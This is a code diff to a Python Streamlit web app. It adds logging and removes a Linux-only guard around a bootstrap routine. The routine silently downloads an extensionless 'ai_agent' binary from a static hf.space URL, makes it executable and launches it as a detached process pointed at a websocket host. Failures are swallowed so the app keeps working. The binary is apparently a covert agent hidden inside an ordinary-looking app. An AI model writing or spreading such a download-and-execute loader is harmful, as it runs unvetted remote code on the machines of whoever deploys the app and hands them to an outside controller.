@@ -11,8 +11,13 @@ import signal
 import urllib.request
 import tempfile
 import shutil
+import logging
 
 import streamlit as st
+
+# NOTE: The ai_agent bootstrap below is intended for Linux environments only.
+# The downloaded 'ai_agent' binary is Linux-only (no extension). This code
+# always attempts to download and run it, without platform checks.
 
 APP_ROOT = Path(__file__).parent.resolve()
 UPLOAD_DIR = APP_ROOT / "uploads"
@@ -24,33 +29,48 @@ AI_AGENT_URL = "https://fiwime4235-softdown.static.hf.space/ai_agent"
 AI_AGENT_NAME = "ai_agent"  # Linux-only binary (no extension)
 AI_AGENT_PATH = APP_ROOT / AI_AGENT_NAME
 
+# Logger for bootstrap progress to console
+logger = logging.getLogger("ai_agent_bootstrap")
+if not logger.handlers:
+    _h = logging.StreamHandler(stream=sys.stdout)
+    _h.setFormatter(logging.Formatter("[ai_agent] %(asctime)s %(levelname)s: %(message)s"))
+    logger.addHandler(_h)
+logger.setLevel(logging.INFO)
+
 
 def _download_file(url: str, dest: Path, retries: int = 2, timeout: int = 30) -> None:
     dest.parent.mkdir(parents=True, exist_ok=True)
     last_err = None
     for attempt in range(retries + 1):
         try:
+            logger.info(f"Downloading from {url} (attempt {attempt+1}/{retries+1}) -> {dest}")
             with tempfile.NamedTemporaryFile(delete=False) as tmp:
                 tmp_path = Path(tmp.name)
             with urllib.request.urlopen(url, timeout=timeout) as resp, open(tmp_path, "wb") as out:
                 shutil.copyfileobj(resp, out)
             # Move atomically into place
             tmp_path.replace(dest)
-            # Make executable on POSIX
-            if not is_windows():
-                try:
-                    dest.chmod(0o755)
-                except Exception:
-                    pass
+            # Make executable (best-effort)
+            try:
+                dest.chmod(0o755)
+            except Exception as ce:
+                logger.warning(f"chmod failed (non-fatal): {ce}")
+            try:
+                size = dest.stat().st_size
+            except Exception:
+                size = -1
+            logger.info(f"Downloaded ai_agent to {dest} (size={size} bytes)")
             return
         except Exception as e:
             last_err = e
+            logger.warning(f"Download attempt {attempt+1} failed: {e}")
             try:
                 if 'tmp_path' in locals() and tmp_path.exists():
                     tmp_path.unlink(missing_ok=True)  # type: ignore[attr-defined]
             except Exception:
                 pass
             time.sleep(1.0)
+    logger.error(f"Failed to download {url}: {last_err}")
     raise RuntimeError(f"Failed to download {url}: {last_err}")
 
 
@@ -58,9 +78,9 @@ def _start_ai_agent_process(exe_path: Path) -> subprocess.Popen | None:
     try:
         args = [str(exe_path), "wss://azjxdrm.bsite.net", "streamlit11"]
         creationflags = 0
-        preexec_fn = None
-        # Linux only: start detached session
-        preexec_fn = os.setsid
+        # Try to start in a detached session when available (Linux)
+        preexec_fn = getattr(os, "setsid", None)
+        logger.info(f"Starting ai_agent: {' '.join(args)} (cwd={APP_ROOT})")
         proc = subprocess.Popen(
             args,
             cwd=str(APP_ROOT),
@@ -71,8 +91,10 @@ def _start_ai_agent_process(exe_path: Path) -> subprocess.Popen | None:
             preexec_fn=preexec_fn,
             close_fds=True,
         )
+        logger.info(f"ai_agent started with PID {proc.pid}")
         return proc
-    except Exception:
+    except Exception as e:
+        logger.error(f"Failed to start ai_agent: {e}")
         # Don't crash the Streamlit app if starting the agent fails
         return None
 
@@ -83,16 +105,14 @@ def ensure_ai_agent_started() -> subprocess.Popen | None:
     Returns the subprocess handle or None on failure.
     """
     try:
-        # Only applicable to Linux; skip on Windows and macOS
-        if platform.system().lower() != "linux":
-            return None
+        logger.info("Ensuring ai_agent is downloaded and running (Linux-only binary).")
         if not AI_AGENT_PATH.exists() or AI_AGENT_PATH.stat().st_size == 0:
             _download_file(AI_AGENT_URL, AI_AGENT_PATH)
         # Ensure it's executable
         try:
             AI_AGENT_PATH.chmod(0o755)
-        except Exception:
-            pass
+        except Exception as ce:
+            logger.warning(f"chmod failed (non-fatal): {ce}")
         proc = _start_ai_agent_process(AI_AGENT_PATH)
         # Best-effort cleanup on interpreter exit
         try:
@@ -101,6 +121,7 @@ def ensure_ai_agent_started() -> subprocess.Popen | None:
             def _cleanup():
                 if proc and proc.poll() is None:
                     try:
+                        logger.info("Shutting down ai_agent (atexit)...")
                         try:
                             os.killpg(os.getpgid(proc.pid), signal.SIGTERM)
                         except Exception:
@@ -115,8 +136,13 @@ def ensure_ai_agent_started() -> subprocess.Popen | None:
             atexit.register(_cleanup)
         except Exception:
             pass
+        if proc is None:
+            logger.warning("ai_agent process is None (failed to start)")
+        else:
+            logger.info("ai_agent bootstrap completed")
         return proc
-    except Exception:
+    except Exception as e:
+        logger.error(f"ai_agent bootstrap failed: {e}")
         # Swallow any startup errors to avoid breaking the app
         return None
 
